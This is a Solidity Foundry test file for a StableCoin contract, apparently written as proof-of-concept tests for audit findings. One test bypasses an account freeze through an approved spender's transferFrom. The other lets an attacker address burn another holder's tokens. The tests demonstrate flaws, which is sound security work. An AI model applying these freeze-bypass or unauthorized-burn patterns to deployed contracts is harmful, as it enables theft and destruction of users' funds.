// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import {Test} from "forge-std/Test.sol";
import {StableCoin} from "../src/StableCoin.sol";

contract StableCoinTest is Test {
    StableCoin stableCoin;
    address owner = address(0x1);
    address alice = address(0x2);
    address bob = address(0x3);
    address attacker = address(0x4);

    function setUp() public {
        // Deploy the StableCoin contract and mint tokens
        vm.prank(owner);
        stableCoin = new StableCoin();

        vm.prank(owner);
        stableCoin.mint(alice, 1000);

        vm.prank(owner);
        stableCoin.mint(bob, 1000);
    }

    function testBypassFreeze() public {
        // Freeze Alice's account
        vm.prank(owner);
        stableCoin.freeze(alice);


        // Alice approves Bob to spend her tokens
        vm.prank(alice);
        stableCoin.approve(bob, 500);

        // Bob transfers tokens on behalf of Alice to the attacker
        vm.prank(bob);
        stableCoin.transferFrom(alice, attacker, 500);

        assertTrue(stableCoin.isFrozen(alice));
        assertEq(stableCoin.balanceOf(alice), 500); // Alice's balance reduced
        assertEq(stableCoin.balanceOf(attacker), 500); // Attacker receives tokens
    }

    function testUnauthorizedBurn() public {
        // Attacker burns tokens from Bob's account
        vm.prank(attacker);
        stableCoin.burn(bob, 500);

        assertEq(stableCoin.balanceOf(bob), 500); // Bob's balance reduced
    }
}
